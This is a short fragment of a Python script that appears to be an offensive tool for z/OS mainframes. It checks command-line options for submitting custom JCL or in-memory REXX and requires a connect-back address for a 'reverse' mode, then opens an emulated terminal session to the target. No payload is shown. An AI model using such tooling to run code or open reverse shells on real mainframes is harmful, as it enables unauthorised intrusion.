    group_job.add_argument('--rexx',help='Custom REXX file to execute in memory. No label or line continuation must be present in the file',dest='rexx_file')
    
    
    results = parser.parse_args()
    
    if results.submit=="custom" and not results.jcl:
       whine('use --jcl option to input path of JCL to submit','err');
       sys.exit();
       
    if results.submit.find("rexx") > -1 and not results.rexx_file:
       whine('use --rexx option to input path of REXX to submit','err');
       sys.exit();
       
    if results.submit=="custom" and not os.path.isfile(results.jcl) :
       whine('Cannot access file '+results.jcl,'err');
       sys.exit();
       
    if results.submit.find("rexx") > -1 and not os.path.isfile(results.rexx_file) :
       whine('Cannot access file '+results.rexx_file,'err');
       sys.exit();
       
    if ((results.submit.find("reverse") >-1) and (results.lhost == None or len(results.lhost.split(":")) < 2)):
        whine('You must specify a connect back address with the option --lhost <LHOST:PORT> ','err')
        sys.exit()      

    em = WrappedEmulator(False)
    connect_zOS(results.IP+":"+results.PORT)
    
    
    main(results)
